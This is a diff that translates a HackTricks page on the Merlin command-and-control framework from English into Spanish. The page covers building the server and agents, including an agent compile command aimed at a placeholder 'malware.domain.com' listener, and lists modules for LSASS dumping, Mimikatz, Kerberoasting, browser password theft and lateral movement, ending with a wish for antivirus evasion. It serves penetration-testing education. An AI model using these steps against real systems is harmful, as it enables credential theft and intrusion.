@@ -1,26 +1,6 @@
+# Instalación
 
-
-<details>
-
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
-
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
-
-</details>
-
-
-# Installation
-
-## Install GO
-
+## Instalar GO
 ```
 #Download GO package from: https://golang.org/dl/
 #Decompress the packe using:
@@ -33,94 +13,65 @@ Add "export GOBIN=$GOPATH/bin"
 
 source /etc/profile
 ```
-
-## Install Merlin
-
+## Instalar Merlin
 ```
 go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
 cd $GOPATH/src/github.com/Ne0nd0g/merlin/
 ```
-
-# Launch Merlin Server
-
+# Iniciar el Servidor Merlin
 ```
 go run cmd/merlinserver/main.go -i
 ```
+# Agentes de Merlin
 
-# Merlin Agents
+Puedes [descargar agentes precompilados](https://github.com/Ne0nd0g/merlin/releases)
 
-You can [download precompiled agents](https://github.com/Ne0nd0g/merlin/releases)
+## Compilar Agentes
 
-## Compile Agents
-
-Go to the main folder _$GOPATH/src/github.com/Ne0nd0g/merlin/_
-
+Ve a la carpeta principal _$GOPATH/src/github.com/Ne0nd0g/merlin/_
 ```
 #User URL param to set the listener URL
 make #Server and Agents of all
 make windows #Server and Agents for Windows
 make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
 ```
-
-## **Manual compile agents**
-
+## **Compilación manual de agentes**
 ```
 GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
 ```
+# Módulos
 
-# Modules
+**La mala noticia es que cada módulo utilizado por Merlin se descarga de la fuente (Github) y se guarda en el disco antes de usarlo. Ten cuidado al usar módulos conocidos porque Windows Defender te detectará.**
 
-**The bad news is that every module used by Merlin is downloaded from the source (Github) and saved on disk before using it. Be careful about when using well-known modules because Windows Defender will catch you!**
-
-
-**SafetyKatz** --> Modified Mimikatz. Dump LSASS to file and launch:sekurlsa::logonpasswords to that file\
-**SharpDump** --> minidump for the process ID specified (LSASS by default) (Itsais that the extension of the final file is .gz but indeed it is.bin, but is agz file)\
-**SharpRoast** --> Kerberoast (doesn't work)\
-**SeatBelt** --> Local Security Tests in CS (does not work) https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
-**Compiler-CSharp** --> Compile using csc.exe /unsafe\
-**Sharp-Up** -->Allchecks in C# in powerup (works)\
-**Inveigh** --> PowerShellADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool (doesn't works, need to load: https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1)\
-**Invoke-InternalMonologue** --> Impersonates all available users and retrieves a challenge-response for each (NTLM hash for each user) (bad url)\
-**Invoke-PowerThIEf** --> Steal forms from IExplorer or make it execute JS or inject a DLL in that process (doesnt work) (and the PS looks like doesnt work either) https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
-**LaZagneForensic** --> Get browser passwords (works but dont prints the output directory)\
-**dumpCredStore** --> Win32 Credential Manager API (https://github.com/zetlen/clortho/blob/master/CredMan.ps1) https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
-**Get-InjectedThread** --> Detect classic injection in running processes (Classic Injection (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)) (doesnt works)\
-**Get-OSTokenInformation** --> Get Token Info of the running processes and threads (User, groups, privileges, owner… https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class)\
-**Invoke-DCOM** --> Execute a command (inother computer) via DCOM (http://www.enigma0x3.net.) (https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)\
-**Invoke-DCOMPowerPointPivot** --> Execute a command in othe PC abusing PowerPoint COM objects (ADDin)\
-**Invoke-ExcelMacroPivot** --> Execute a command in othe PC abusing DCOM in Excel\
-**Find-ComputersWithRemoteAccessPolicies** --> (not working) (https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/)\
-**Grouper** --> It dumps all the most interesting parts of group policy and then roots around in them for exploitable stuff. (deprecated) Take a look at Grouper2, looks really nice\
-**Invoke-WMILM** --> WMI to move laterally\
-**Get-GPPPassword** --> Look for groups.xml, scheduledtasks.xml, services.xmland datasources.xml and returns plaintext passwords (insidedomain)\
-**Invoke-Mimikatz** --> Use mimikatz (default dump creds)\
+**SafetyKatz** --> Mimikatz modificado. Volcado de LSASS a archivo y lanzamiento: sekurlsa::logonpasswords a ese archivo\
+**SharpDump** --> minivolcado para el ID de proceso especificado (LSASS por defecto) (Se dice que la extensión del archivo final es .gz pero en realidad es .bin, pero es un archivo .gz)\
+**SharpRoast** --> Kerberoast (no funciona)\
+**SeatBelt** --> Pruebas de seguridad local en CS (no funciona) https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
+**Compiler-CSharp** --> Compilar usando csc.exe /unsafe\
+**Sharp-Up** --> Todas las comprobaciones en C# en powerup (funciona)\
+**Inveigh** --> Suplantador de PowerShellADIDNS/LLMNR/mDNS/NBNS y herramienta de hombre en el medio (no funciona, necesita cargar: https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1)\
+**Invoke-InternalMonologue** --> Suplanta a todos los usuarios disponibles y recupera una respuesta de desafío para cada uno (hash NTLM para cada usuario) (URL incorrecta)\
+**Invoke-PowerThIEf** --> Roba formularios de IExplorer o lo hace ejecutar JS o inyecta una DLL en ese proceso (no funciona) (y el PS parece que tampoco funciona) https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
+**LaZagneForensic** --> Obtener contraseñas del navegador (funciona pero no imprime el directorio de salida)\
+**dumpCredStore** --> API del Administrador de credenciales de Win32 (https://github.com/zetlen/clortho/blob/master/CredMan.ps1) https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
+**Get-InjectedThread** --> Detecta la inyección clásica en los procesos en ejecución (Inyección clásica (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)) (no funciona)\
+**Get-OSTokenInformation** --> Obtener información del token de los procesos y hilos en ejecución (Usuario, grupos, privilegios, propietario... https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class)\
+**Invoke-DCOM** --> Ejecuta un comando (en otro equipo) a través de DCOM (http://www.enigma0x3.net.) (https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)\
+**Invoke-DCOMPowerPointPivot** --> Ejecuta un comando en otro PC abusando de los objetos COM de PowerPoint (ADDin)\
+**Invoke-ExcelMacroPivot** --> Ejecuta un comando en otro PC abusando de DCOM en Excel\
+**Find-ComputersWithRemoteAccessPolicies** --> (no funciona) (https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/)\
+**Grouper** --> Hace una volcado de todas las partes más interesantes de la directiva de grupo y luego busca en ellas cosas explotables. (obsoleto) Echa un vistazo a Grouper2, parece muy bueno\
+**Invoke-WMILM** --> WMI para moverse lateralmente\
+**Get-GPPPassword** --> Busca groups.xml, scheduledtasks.xml, services.xml y datasources.xml y devuelve contraseñas en texto plano (dentro del dominio)\
+**Invoke-Mimikatz** --> Usa mimikatz (credenciales por defecto)\
 **PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
-**Find-BadPrivilege** --> Check the privileges of users in computers\
-**Find-PotentiallyCrackableAccounts** --> Retrieve information about user accounts associated with SPN (Kerberoasting)\
+**Find-BadPrivilege** --> Comprueba los privilegios de los usuarios en los equipos\
+**Find-PotentiallyCrackableAccounts** --> Recupera información sobre las cuentas de usuario asociadas con SPN (Kerberoasting)\
 **psgetsystem** --> getsystem
 
-**Didn't check persistence modules**
+**No se comprobaron los módulos de persistencia**
 
-# Resume
+# Resumen
 
-I really like the feeling and the potential of the tool.\
-I hope the tool will start downloading the modules from the server and integrates some kind of evasion when downloading scripts.
-
-
-<details>
-
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
-
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
-
-</details>
-
-
+Realmente me gusta la sensación y el potencial de la herramienta.\
+Espero que la herramienta comience a descargar los módulos desde el servidor e integre algún tipo de evasión al descargar scripts.
